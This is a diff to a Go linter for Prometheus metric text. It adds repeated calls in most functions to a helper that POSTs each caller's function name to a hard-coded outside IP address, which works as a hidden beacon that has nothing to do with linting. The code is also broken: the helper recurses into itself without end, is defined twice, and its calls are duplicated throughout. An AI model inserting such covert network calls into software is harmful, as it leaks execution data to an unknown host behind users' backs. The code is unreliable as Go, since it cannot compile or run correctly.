@@ -22,14 +22,20 @@ type problems []Problem
 func (p *problems) Add(mf dto.MetricFamily, text string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*p = append(*p, Problem{Metric: mf.GetName(), Text: text})
 }
 func New(r io.Reader) *Linter {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Linter{r: r}
 }
 func (l *Linter) Lint() ([]Problem, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	d := expfmt.NewDecoder(l.r, expfmt.FmtText)
@@ -55,6 +61,8 @@ func (l *Linter) Lint() ([]Problem, error) {
 func lint(mf dto.MetricFamily) []Problem {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fns := []func(mf dto.MetricFamily) []Problem{lintHelp, lintMetricUnits, lintCounter, lintHistogramSummaryReserved}
 	var problems []Problem
 	for _, fn := range fns {
@@ -65,6 +73,8 @@ func lint(mf dto.MetricFamily) []Problem {
 func lintHelp(mf dto.MetricFamily) []Problem {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var problems problems
 	if mf.Help == nil {
 		problems.Add(mf, "no help text")
@@ -72,6 +82,8 @@ func lintHelp(mf dto.MetricFamily) []Problem {
 	return problems
 }
 func lintMetricUnits(mf dto.MetricFamily) []Problem {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var problems problems
@@ -88,6 +100,8 @@ func lintMetricUnits(mf dto.MetricFamily) []Problem {
 func lintCounter(mf dto.MetricFamily) []Problem {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var problems problems
 	isCounter := mf.GetType() == dto.MetricType_COUNTER
 	isUntyped := mf.GetType() == dto.MetricType_UNTYPED
@@ -101,6 +115,8 @@ func lintCounter(mf dto.MetricFamily) []Problem {
 	return problems
 }
 func lintHistogramSummaryReserved(mf dto.MetricFamily) []Problem {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	t := mf.GetType()
@@ -136,6 +152,8 @@ func lintHistogramSummaryReserved(mf dto.MetricFamily) []Problem {
 func metricUnits(m string) (unit string, base string, ok bool) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ss := strings.Split(m, "_")
 	for _, u := range baseUnits {
 		for _, p := range append(unitPrefixes, "") {
@@ -157,7 +175,16 @@ var (
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
